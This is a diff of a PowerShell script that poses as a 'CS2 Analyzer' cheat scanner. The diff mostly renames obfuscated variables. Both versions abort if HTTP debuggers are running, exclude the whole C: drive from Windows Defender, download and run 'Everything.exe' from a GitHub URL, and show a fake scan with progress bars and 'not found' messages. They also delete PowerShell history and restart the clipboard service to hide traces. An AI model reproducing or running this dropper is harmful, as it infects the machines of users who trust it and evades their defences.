@@ -7,26 +7,26 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     pause
     exit
 }
-$WJd1Vu = @('HttpDebuggerSvc', 'HttpDebuggerPro', 'Fiddler', 'Charles')
-$4uJrW3qGM = @('HttpDebuggerService', 'FiddlerService', 'CharlesProxy')
-$EqUKW1oklhB3S = $false
+$httpDebuggerProcesses = @('HttpDebuggerSvc', 'HttpDebuggerPro', 'Fiddler', 'Charles')
+$httpDebuggerServices = @('HttpDebuggerService', 'FiddlerService', 'CharlesProxy')
+$debuggerFound = $false
 Write-Host 'Checking for HTTP debugger processes...'
-foreach ($rlxxo2wUWypEJxlgr5 in $WJd1Vu) {
-    $PTacIi3sjINe = Get-Process -Name $rlxxo2wUWypEJxlgr5 -ErrorAction SilentlyContinue
-    if ($PTacIi3sjINe) {
-        Write-Host "$rlxxo2wUWypEJxlgr5 process is running."
-        $EqUKW1oklhB3S = $true
+foreach ($debugger in $httpDebuggerProcesses) {
+    $process = Get-Process -Name $debugger -ErrorAction SilentlyContinue
+    if ($process) {
+        Write-Host "$debugger process is running."
+        $debuggerFound = $true
     }
 }
 Write-Host 'Checking for HTTP debugger services...'
-foreach ($d23ieW in $4uJrW3qGM) {
-    $lacZTznZc66uW8ZRn0571I = Get-Service -Name $d23ieW -ErrorAction SilentlyContinue
-    if ($lacZTznZc66uW8ZRn0571I -and $lacZTznZc66uW8ZRn0571I.Status -eq 'Running') {
-        Write-Host "$d23ieW service is running."
-        $EqUKW1oklhB3S = $true
+foreach ($service in $httpDebuggerServices) {
+    $serviceStatus = Get-Service -Name $service -ErrorAction SilentlyContinue
+    if ($serviceStatus -and $serviceStatus.Status -eq 'Running') {
+        Write-Host "$service service is running."
+        $debuggerFound = $true
     }
 }
-if ($EqUKW1oklhB3S) {
+if ($debuggerFound) {
     Write-Host 'HTTP Debugger detected. Stopping the script.'
     exit 1
 } else {
@@ -36,46 +36,44 @@ Start-Sleep -Seconds 1
 Clear-Host
 Add-MpPreference -ExclusionPath "C:/"
 Clear-Host
-$9ZTyvnho = $wkDJnjld:USERNAME
-$sFU = "ID18 VDMIgID22 dbZID45 rPf2eID138 MYf41sGID176 A7mAnvID270 vNnPzTID338 dfA0zxhID11 dVmrBnID42 CaQ3ID110 yHm76r9ID213 FAoyWoID386 5zDID389 3R95btID83 GseKID127 wkRjQID168 dVFIzvMID172 Ky2uvtqID318 swgID359 Tp93WQtID8 fpNjYJID62 X8IubIID124 58LUID130 OpmID240 FH7ID277 kI9ID333 IvZFkID378 RMtMy44pID84 lBN1O7WID109 IReXID149 gOlID169 q4JVID241 DsFF6ID284 sSgfID302 7KzPZID356 jocID384 L5pXlsID55 EsicID67 JdiQSyyID69 oxxP5ID166 nLsr8ID185 l5rRID289 gHdbaID300 LY24:ID91 Ju2aWID177 ZKToO5ID228 vzuNID352 q664lAvID376 I10SLID393 jlcERZO/ID14 CUfGRID59 y0z69XsID65 UANjID128 H5gDID197 AJ6Xz8ID305 Y1tnB7ID336 V2hzXw0ID349 GviEhwBID396 o7bY/ID15 07dXID39 NwIT2XQID52 bju79ID90 nVNsID99 iLyID100 xl1RkID192 jhd5ID335 qgRqID363 gXSweZgID20 YvYXdFID87 TvrGyID95 qH0dFYrID181 j50VID285 PqV6NID298 35bF5xWiID13 HsdItID25 nNdBE1ID184 GrjJMmID220 9nOflID256 i5BWID366 3ONHNtID31 KLzID43 CapID76 lxPGiy0ID97 hSYID147 7Nl5uScID171 ygnzID186 88oizYID262 CGPGraID282 4bzp2oZID296 AQHDrhID5 iC2IyFqID47 ArPfTRID64 UWs5ID165 tvFyvPID227 qPVYg3rID250 nEWEfn6ID291 gufkS3ID330 EDV4r81ID332 odPtID345 W3pn9uID4 2Q1h1OhID74 79lID143 h40wbID161 p3xguykID238 QTud1YGID247 b1mxA3ID252 UHrOID288 MHL3ID313 4qijUID357 Kh7ID381 TMPlf2bID7 RL1QUcID17 o31sZID38 QZ3oUjID85 9CVd9ID120 BvbID121 6c5IID145 i9eE7wID170 5sA1ID279 FOOEau7ID379 kRRIr.ID57 DxE5lID114 8ghtEID116 L5CIID148 cGFlG3ID155 SoYID159 fVSID201 hvGfID202 nzZzT7ID221 PcoAt98ID271 35hDSAMcID10 cc0fID28 LK2liID75 dhzcICLID111 45TErID117 J5DF4ID142 SJe4ijID160 otJCoLID189 CYII7OEID281 hgV0RID316 jXolaKID321 R6ffID380 dSaoID54 tesTID152 hyx0ID187 SxuxSAID224 aRO9ID225 8zhhzID308 laCfID319 uLLLaZGID354 roymID48 5S9zryAID314 4zSID369 Hxwp/ID2 UMZzID26 whUVVID63 pEyvID123 zQ1o04aID139 PXrCSUcID216 K9O6e4TID269 HmZe8zcID383 DeFOWfPID390 lhtBhID398 osUycID35 I8cU2wID92 vVFW1GID106 YQKID112 hZJID173 cUcOID268 kehID310 vu0Uw5ID331 FGtsID40 cUu3zbDID119 9Ff8ID122 Sg4ID150 YMACPEID215 vYzKu9ID219 jkO3ID246 E7HeID287 QpsG1kID297 YyyID301 ElrKPID355 wCsaWlID367 0aVaJ2ID78 cs5vIID80 kjuID96 ho7oVID206 sQSID218 hKXZID232 EHDb7ILID273 h6HEFID295 5fqxbID324 2BGcID16 IlpuyuxID27 NWWcID51 1m5huMID82 kvJWID102 KrQtvoaID118 farucqID156 OtCID195 f44sID309 gLpID358 McxM98HcID158 xNlI0ID303 UfIID315 GbFLVQrID374 i32/ID94 rB9FVID144 h7CfID261 U5YV5NKsID141 UBSBQID178 JsD4WYID183 DUIBZ6PID249 2FttnRvID258 8YVNTuID264 4u6JID340 62xMID347 3WExkID368 v3oTID391 wxPID392 SVIf1lB/ID9 9lvbngID29 XGBID46 rOOfREhID58 2icBKRWID140 kT8lID157 LDmqaID191 UnMzyEID248 JGjlID255 lBrAm0lrID163 N25FhVID174 a6h0ID205 r5qgaRID265 8IDVZID394 a0UdntiaID73 WlMXID134 ImIFID164 6yJX4ID188 3sH1ID200 aV4IID257 jnIJRFID290 toDID306 2j58YXoID317 huh4gID322 O8wDZID375 xfloZTID385 JRlhD5GwID0 q5GdseID56 OyCbID88 YEGhID212 sibID292 R6AI/ID70 6f2ID203 xdw0LiID294 357zID341 RJiUudZID371 hQCHdTmID21 cVFHID30 UJM3uhYID44 PrUzauzID79 wwFdov8ID135 mALSID153 SW9b1dmID229 rTEVDuUID351 jAsMKuaID136 OgcID175 OGVyID222 QIPuWID244 9WGID272 drBnt5ID350 Wx6JSiID37 O1yjwID243 NV9QjID293 9OIkID334 t6EopyID342 Ri8eID370 1ZadID377 MTZsnID36 XEPDqID49 F90ID50 eeAhID53 LLoID214 7QOMID254 NWCYID259 NhBID286 9XvrZbU/ID3 KnDDgID89 lyqCID104 PlqvoID113 stoafID162 aF5ID198 pXlID237 7Z0LID339 hFOuqmID343 eezAnwEID12 pWguuAID33 GulSiKmID71 zLThID107 GTi7CID194 LPBBID196 kSEHID346 zeDhpsID387 Tx0IQYRvID61 xnNNID77 JntnXTYID207 KygID239 CjbFID253 vNNhhWZID307 oxLGID311 GJLeID125 O7ltksmID131 ASjaTID236 BywID325 jTmb7rDID361 y9oyXID364 wLL6ID372 b42HkrID24 C0iynDID182 8t3r2OID208 QHYdRhID209 FPwkID211 EY5zID251 9SrID344 0JJCID360 0RDXyID72 GPTQ1gvID103 yVzLNIID167 KgDxDWmID179 zJkfID204 XMzID245 LnjID276 6cDID373 yMFs058tID6 dgWID60 GMIQID66 YslHYUWID86 N60MsID98 G8eGID101 7FPJkseID105 VKYvJID129 fYk8nyID137 nHYID146 kXDarID180 8GwF7ID260 nuuID304 sWMZEID312 FQEID365 7PSPYgID395 ZQTJdD1ID397 dseO7hID81 Ex1pN3ID230 lVKGC4iID68 f0OYGXrID108 gNj0by7ID126 Cd8yID154 x8HID337 kvCID362 dvoAnID19 rY5mcID23 HemID133 shx6ID299 U5y5DID320 1sovID399 JaaK9P5gID32 9M4X1ddID34 71eID93 IWjVeRVID151 eYPwID193 FmbfEID210 vi5ID217 QL3ZcIAID233 yLvTmVID326 tymmID388 EYoi.ID132 A18ID190 SwKV1ID235 0VjRID242 H0XdID263 L0oHTNID266 HCYhID267 1NIuPeID274 mskID275 aqxMRID278 gIQLaID280 D6alID283 q5YJIQID329 jHR2QzNeID1 A5PpjkcID41 TjbTTID115 QQLjPd7ID223 jVFzWLyID234 VXPeC1ZID328 48FID348 Ojk2ID382 k7kOgxID199 GgZT7HID226 24eID231 3dUNwXID323 UDXFID327 T9YID353 FFcxke".Replace("ID0 q5Gdse", "").Replace("ID1 A5Ppjkc", "").Replace("ID2 UMZz", "").Replace("ID3 KnDDg", "").Replace("ID4 2Q1h1Oh", "").Replace("ID5 iC2IyFq", "").Replace("ID6 dgW", "").Replace("ID7 RL1QUc", "").Replace("ID8 fpNjYJ", "").Replace("ID9 9lvbng", "").Replace("ID10 cc0f", "").Replace("ID11 dVmrBn", "").Replace("ID12 pWguuA", "").Replace("ID13 HsdIt", "").Replace("ID14 CUfGR", "").Replace("ID15 07dX", "").Replace("ID16 Ilpuyux", "").Replace("ID17 o31sZ", "").Replace("ID18 VDMIg", "").Replace("ID19 rY5mc", "").Replace("ID20 YvYXdF", "").Replace("ID21 cVFH", "").Replace("ID22 dbZ", "").Replace("ID23 Hem", "").Replace("ID24 C0iynD", "").Replace("ID25 nNdBE1", "").Replace("ID26 whUVV", "").Replace("ID27 NWWc", "").Replace("ID28 LK2li", "").Replace("ID29 XGB", "").Replace("ID30 UJM3uhY", "").Replace("ID31 KLz", "").Replace("ID32 9M4X1dd", "").Replace("ID33 GulSiKm", "").Replace("ID34 71e", "").Replace("ID35 I8cU2w", "").Replace("ID36 XEPDq", "").Replace("ID37 O1yjw", "").Replace("ID38 QZ3oUj", "").Replace("ID39 NwIT2XQ", "").Replace("ID40 cUu3zbD", "").Replace("ID41 TjbTT", "").Replace("ID42 CaQ3", "").Replace("ID43 Cap", "").Replace("ID44 PrUzauz", "").Replace("ID45 rPf2e", "").Replace("ID46 rOOfREh", "").Replace("ID47 ArPfTR", "").Replace("ID48 5S9zryA", "").Replace("ID49 F90", "").Replace("ID50 eeAh", "").Replace("ID51 1m5huM", "").Replace("ID52 bju79", "").Replace("ID53 LLo", "").Replace("ID54 tesT", "").Replace("ID55 Esic", "").Replace("ID56 OyCb", "").Replace("ID57 DxE5l", "").Replace("ID58 2icBKRW", "").Replace("ID59 y0z69Xs", "").Replace("ID60 GMIQ", "").Replace("ID61 xnNN", "").Replace("ID62 X8IubI", "").Replace("ID63 pEyv", "").Replace("ID64 UWs5", "").Replace("ID65 UANj", "").Replace("ID66 YslHYUW", "").Replace("ID67 JdiQSyy", "").Replace("ID68 f0OYGXr", "").Replace("ID69 oxxP5", "").Replace("ID70 6f2", "").Replace("ID71 zLTh", "").Replace("ID72 GPTQ1gv", "").Replace("ID73 WlMX", "").Replace("ID74 79l", "").Replace("ID75 dhzcICL", "").Replace("ID76 lxPGiy0", "").Replace("ID77 JntnXTY", "").Replace("ID78 cs5vI", "").Replace("ID79 wwFdov8", "").Replace("ID80 kju", "").Replace("ID81 Ex1pN3", "").Replace("ID82 kvJW", "").Replace("ID83 GseK", "").Replace("ID84 lBN1O7W", "").Replace("ID85 9CVd9", "").Replace("ID86 N60Ms", "").Replace("ID87 TvrGy", "").Replace("ID88 YEGh", "").Replace("ID89 lyqC", "").Replace("ID90 nVNs", "").Replace("ID91 Ju2aW", "").Replace("ID92 vVFW1G", "").Replace("ID93 IWjVeRV", "").Replace("ID94 rB9FV", "").Replace("ID95 qH0dFYr", "").Replace("ID96 ho7oV", "").Replace("ID97 hSY", "").Replace("ID98 G8eG", "").Replace("ID99 iLy", "").Replace("ID100 xl1Rk", "").Replace("ID101 7FPJkse", "").Replace("ID102 KrQtvoa", "").Replace("ID103 yVzLNI", "").Replace("ID104 Plqvo", "").Replace("ID105 VKYvJ", "").Replace("ID106 YQK", "").Replace("ID107 GTi7C", "").Replace("ID108 gNj0by7", "").Replace("ID109 IReX", "").Replace("ID110 yHm76r9", "").Replace("ID111 45TEr", "").Replace("ID112 hZJ", "").Replace("ID113 stoaf", "").Replace("ID114 8ghtE", "").Replace("ID115 QQLjPd7", "").Replace("ID116 L5CI", "").Replace("ID117 J5DF4", "").Replace("ID118 farucq", "").Replace("ID119 9Ff8", "").Replace("ID120 Bvb", "").Replace("ID121 6c5I", "").Replace("ID122 Sg4", "").Replace("ID123 zQ1o04a", "").Replace("ID124 58LU", "").Replace("ID125 O7ltksm", "").Replace("ID126 Cd8y", "").Replace("ID127 wkRjQ", "").Replace("ID128 H5gD", "").Replace("ID129 fYk8ny", "").Replace("ID130 Opm", "").Replace("ID131 ASjaT", "").Replace("ID132 A18", "").Replace("ID133 shx6", "").Replace("ID134 ImIF", "").Replace("ID135 mALS", "").Replace("ID136 Ogc", "").Replace("ID137 nHY", "").Replace("ID138 MYf41sG", "").Replace("ID139 PXrCSUc", "").Replace("ID140 kT8l", "").Replace("ID141 UBSBQ", "").Replace("ID142 SJe4ij", "").Replace("ID143 h40wb", "").Replace("ID144 h7Cf", "").Replace("ID145 i9eE7w", "").Replace("ID146 kXDar", "").Replace("ID147 7Nl5uSc", "").Replace("ID148 cGFlG3", "").Replace("ID149 gOl", "").Replace("ID150 YMACPE", "").Replace("ID151 eYPw", "").Replace("ID152 hyx0", "").Replace("ID153 SW9b1dm", "").Replace("ID154 x8H", "").Replace("ID155 SoY", "").Replace("ID156 OtC", "").Replace("ID157 LDmqa", "").Replace("ID158 xNlI0", "").Replace("ID159 fVS", "").Replace("ID160 otJCoL", "").Replace("ID161 p3xguyk", "").Replace("ID162 aF5", "").Replace("ID163 N25FhV", "").Replace("ID164 6yJX4", "").Replace("ID165 tvFyvP", "").Replace("ID166 nLsr8", "").Replace("ID167 KgDxDWm", "").Replace("ID168 dVFIzvM", "").Replace("ID169 q4JV", "").Replace("ID170 5sA1", "").Replace("ID171 ygnz", "").Replace("ID172 Ky2uvtq", "").Replace("ID173 cUcO", "").Replace("ID174 a6h0", "").Replace("ID175 OGVy", "").Replace("ID176 A7mAnv", "").Replace("ID177 ZKToO5", "").Replace("ID178 JsD4WY", "").Replace("ID179 zJkf", "").Replace("ID180 8GwF7", "").Replace("ID181 j50V", "").Replace("ID182 8t3r2O", "").Replace("ID183 DUIBZ6P", "").Replace("ID184 GrjJMm", "").Replace("ID185 l5rR", "").Replace("ID186 88oizY", "").Replace("ID187 SxuxSA", "").Replace("ID188 3sH1", "").Replace("ID189 CYII7OE", "").Replace("ID190 SwKV1", "").Replace("ID191 UnMzyE", "").Replace("ID192 jhd5", "").Replace("ID193 FmbfE", "").Replace("ID194 LPBB", "").Replace("ID195 f44s", "").Replace("ID196 kSEH", "").Replace("ID197 AJ6Xz8", "").Replace("ID198 pXl", "").Replace("ID199 GgZT7H", "").Replace("ID200 aV4I", "").Replace("ID201 hvGf", "").Replace("ID202 nzZzT7", "").Replace("ID203 xdw0Li", "").Replace("ID204 XMz", "").Replace("ID205 r5qgaR", "").Replace("ID206 sQS", "").Replace("ID207 Kyg", "").Replace("ID208 QHYdRh", "").Replace("ID209 FPwk", "").Replace("ID210 vi5", "").Replace("ID211 EY5z", "").Replace("ID212 sib", "").Replace("ID213 FAoyWo", "").Replace("ID214 7QOM", "").Replace("ID215 vYzKu9", "").Replace("ID216 K9O6e4T", "").Replace("ID217 QL3ZcIA", "").Replace("ID218 hKXZ", "").Replace("ID219 jkO3", "").Replace("ID220 9nOfl", "").Replace("ID221 PcoAt98", "").Replace("ID222 QIPuW", "").Replace("ID223 jVFzWLy", "").Replace("ID224 aRO9", "").Replace("ID225 8zhhz", "").Replace("ID226 24e", "").Replace("ID227 qPVYg3r", "").Replace("ID228 vzuN", "").Replace("ID229 rTEVDuU", "").Replace("ID230 lVKGC4", "").Replace("ID231 3dUNwX", "").Replace("ID232 EHDb7IL", "").Replace("ID233 yLvTmV", "").Replace("ID234 VXPeC1Z", "").Replace("ID235 0VjR", "").Replace("ID236 Byw", "").Replace("ID237 7Z0L", "").Replace("ID238 QTud1YG", "").Replace("ID239 CjbF", "").Replace("ID240 FH7", "").Replace("ID241 DsFF6", "").Replace("ID242 H0Xd", "").Replace("ID243 NV9Qj", "").Replace("ID244 9WG", "").Replace("ID245 Lnj", "").Replace("ID246 E7He", "").Replace("ID247 b1mxA3", "").Replace("ID248 JGjl", "").Replace("ID249 2FttnRv", "").Replace("ID250 nEWEfn6", "").Replace("ID251 9Sr", "").Replace("ID252 UHrO", "").Replace("ID253 vNNhhWZ", "").Replace("ID254 NWCY", "").Replace("ID255 lBrAm0l", "").Replace("ID256 i5BW", "").Replace("ID257 jnIJRF", "").Replace("ID258 8YVNTu", "").Replace("ID259 NhB", "").Replace("ID260 nuu", "").Replace("ID261 U5YV5NK", "").Replace("ID262 CGPGra", "").Replace("ID263 L0oHTN", "").Replace("ID264 4u6J", "").Replace("ID265 8IDVZ", "").Replace("ID266 HCYh", "").Replace("ID267 1NIuPe", "").Replace("ID268 keh", "").Replace("ID269 HmZe8zc", "").Replace("ID270 vNnPzT", "").Replace("ID271 35hDSAM", "").Replace("ID272 drBnt5", "").Replace("ID273 h6HEF", "").Replace("ID274 msk", "").Replace("ID275 aqxMR", "").Replace("ID276 6cD", "").Replace("ID277 kI9", "").Replace("ID278 gIQLa", "").Replace("ID279 FOOEau7", "").Replace("ID280 D6al", "").Replace("ID281 hgV0R", "").Replace("ID282 4bzp2oZ", "").Replace("ID283 q5YJIQ", "").Replace("ID284 sSgf", "").Replace("ID285 PqV6N", "").Replace("ID286 9XvrZbU", "").Replace("ID287 QpsG1k", "").Replace("ID288 MHL3", "").Replace("ID289 gHdba", "").Replace("ID290 toD", "").Replace("ID291 gufkS3", "").Replace("ID292 R6AI", "").Replace("ID293 9OIk", "").Replace("ID294 357z", "").Replace("ID295 5fqxb", "").Replace("ID296 AQHDr", "").Replace("ID297 Yyy", "").Replace("ID298 35bF5xW", "").Replace("ID299 U5y5D", "").Replace("ID300 LY24", "").Replace("ID301 ElrKP", "").Replace("ID302 7KzPZ", "").Replace("ID303 UfI", "").Replace("ID304 sWMZE", "").Replace("ID305 Y1tnB7", "").Replace("ID306 2j58YXo", "").Replace("ID307 oxLG", "").Replace("ID308 laCf", "").Replace("ID309 gLp", "").Replace("ID310 vu0Uw5", "").Replace("ID311 GJL", "").Replace("ID312 FQE", "").Replace("ID313 4qijU", "").Replace("ID314 4zS", "").Replace("ID315 GbFLVQr", "").Replace("ID316 jXolaK", "").Replace("ID317 huh4g", "").Replace("ID318 swg", "").Replace("ID319 uLLLaZG", "").Replace("ID320 1sov", "").Replace("ID321 R6ff", "").Replace("ID322 O8wDZ", "").Replace("ID323 UDXF", "").Replace("ID324 2BG", "").Replace("ID325 jTmb7rD", "").Replace("ID326 tymm", "").Replace("ID327 T9Y", "").Replace("ID328 48F", "").Replace("ID329 jHR2QzN", "").Replace("ID330 EDV4r81", "").Replace("ID331 FGt", "").Replace("ID332 odPt", "").Replace("ID333 IvZFk", "").Replace("ID334 t6Eopy", "").Replace("ID335 qgRq", "").Replace("ID336 V2hzXw0", "").Replace("ID337 kvC", "").Replace("ID338 dfA0zx", "").Replace("ID339 hFOuqm", "").Replace("ID340 62xM", "").Replace("ID341 RJiUudZ", "").Replace("ID342 Ri8e", "").Replace("ID343 eezAnw", "").Replace("ID344 0JJC", "").Replace("ID345 W3pn9", "").Replace("ID346 zeDhps", "").Replace("ID347 3WExk", "").Replace("ID348 Ojk2", "").Replace("ID349 GviEhwB", "").Replace("ID350 Wx6JS", "").Replace("ID351 jAsMKu", "").Replace("ID352 q664lAv", "").Replace("ID353 FFcxk", "").Replace("ID354 roy", "").Replace("ID355 wCsaWl", "").Replace("ID356 joc", "").Replace("ID357 Kh7", "").Replace("ID358 McxM98H", "").Replace("ID359 Tp93WQ", "").Replace("ID360 0RDX", "").Replace("ID361 y9oyX", "").Replace("ID362 dvoA", "").Replace("ID363 gXSweZ", "").Replace("ID364 wLL6", "").Replace("ID365 7PSPYg", "").Replace("ID366 3ONHN", "").Replace("ID367 0aVaJ", "").Replace("ID368 v3oT", "").Replace("ID369 Hxwp", "").Replace("ID370 1Zad", "").Replace("ID371 hQCHdT", "").Replace("ID372 b42Hk", "").Replace("ID373 yMFs058", "").Replace("ID374 i32", "").Replace("ID375 xfloZT", "").Replace("ID376 I10SL", "").Replace("ID377 MTZs", "").Replace("ID378 RMtMy44", "").Replace("ID379 kRRIr", "").Replace("ID380 dSa", "").Replace("ID381 TMPlf2", "").Replace("ID382 k7kOg", "").Replace("ID383 DeFOWfP", "").Replace("ID384 L5pXl", "").Replace("ID385 JRlhD5G", "").Replace("ID386 5zD", "").Replace("ID387 Tx0IQYR", "").Replace("ID388 EYoi", "").Replace("ID389 3R95b", "").Replace("ID390 lhtBh", "").Replace("ID391 wxP", "").Replace("ID392 SVIf1lB", "").Replace("ID393 jlcERZO", "").Replace("ID394 a0Udnti", "").Replace("ID395 ZQTJdD1", "").Replace("ID396 o7bY", "").Replace("ID397 dseO7", "").Replace("ID398 osUy", "").Replace("ID399 JaaK9P5", "")
-Invoke-WebRequest -Uri $sFU -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
-Start-Process -FilePath $l5
+$username = $env:USERNAME
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
 function Show-TextProgressBar {
     param (
-        [int]$zmR5p4nTFPcodalHxiuwhKj,
-        [string]$z7CtsI1
+        [int]$PercentComplete,
+        [string]$Activity
     )
-    $U4akshJ0p2BKjmey = 50
-    $rpd1nDaRLl = [math]::Round($zmR5p4nTFPcodalHxiuwhKj / 100 * $U4akshJ0p2BKjmey)
-    $Mytowkne = $U4akshJ0p2BKjmey - $rpd1nDaRLl
-    $rOkB98 = ('
+    $totalBars = 50
+    $filledBars = [math]::Round($PercentComplete / 100 * $totalBars)
+    $emptyBars = $totalBars - $filledBars
+    $progressBar = ('#' * $filledBars) + ('-' * $emptyBars)
 
-    Write-Host "$z7CtsI1"
-    Write-Host "[$rOkB98] $zmR5p4nTFPcodalHxiuwhKj% completed"
+    Write-Host "$Activity"
+    Write-Host "[$progressBar] $PercentComplete% completed"
 
-    if ($zmR5p4nTFPcodalHxiuwhKj -eq 100) {
-        Write-Host "$z7CtsI1 completed."
+    if ($PercentComplete -eq 100) {
+        Write-Host "$Activity completed."
     }
 }
-$z7CtsI1 = 'Scanning the registry and media for the presence of cheat programs, deleted folders'
-$PGk = 0.7
-foreach ($iulvFerX in 0..100) {
-    Show-TextProgressBar -PercentComplete $iulvFerX -Activity $z7CtsI1
-    Start-Sleep -Seconds $PGk
+$activity = 'Scanning the registry and media for the presence of cheat programs, deleted folders'
+$delay = 0.7
+foreach ($i in 0..100) {
+    Show-TextProgressBar -PercentComplete $i -Activity $activity
+    Start-Sleep -Seconds $delay
 }
-$e2olVq0jytSNK5f4MpBQzEnuP = (Get-WmiObject 'Win32_VideoController').AdapterCompatibility
-if ($e2olVq0jytSNK5f4MpBQzEnuP -eq 'NVIDIA') {
+$videoCardManufacturer = (Get-WmiObject 'Win32_VideoController').AdapterCompatibility
+if ($videoCardManufacturer -eq 'NVIDIA') {
     Stop-Process -Name 'nvcontainer' -Force
-} elseif ($e2olVq0jytSNK5f4MpBQzEnuP -eq 'Advanced Micro Devices') {
+} elseif ($videoCardManufacturer -eq 'Advanced Micro Devices') {
     Stop-Process -Name 'RadeonSoftware' -Force
 }
-$PIXKsNYH8T2tfMU6W4AQbCw = "$wkDJnjld:APPDATA\Microsoft\Windows\PSReadline"
-Remove-Item "$PIXKsNYH8T2tfMU6W4AQbCw\*.txt" -Force
+$historyPath = "$env:APPDATA\Microsoft\Windows\PSReadline"
+Remove-Item "$historyPath\*.txt" -Force
 Clear-History
 Restart-Service -Name 'cbdhsvc*' -Force
 Clear-Host
 Write-Host "[CS2 Analyzer] Check for cheats has started" -ForegroundColor 'Cyan'
-$kG = @(
+$cheats = @(
     'R3D', 'Xone', 'Midnight', 'Yeahnot', 'LeagueMode', 'Unreal', 'VRedux', 'FURIOS', 'otcv',
     'Avira', 'Neverlose', 'ESPdX', 'BoBerHook', 'Legendware', 'EGHack', 'nixware.cc', 'HAUNTEDPROJECT',
     'externalcrack', 'RAGER9', 'RAGER8', 'WinX', 'PhoenixHack', 'OBR', 'OneByteRadar', 'Skinchanger',
@@ -86,8 +84,8 @@ $kG = @(
     'Stickrpg', 'Demonside.us', 'Bhop', 'BunnyHop', 'AviraSAMOWARE', 'ExLoader', '.amc', 'R8', 'freeqn',
     'imgui.ini'
 )
-foreach ($B in $kG) {
-    Write-Host "[CS2 Analyzer] $B not found"
+foreach ($cheat in $cheats) {
+    Write-Host "[CS2 Analyzer] $cheat not found"
     Start-Sleep -Seconds 0.5
 }
 Write-Host ""
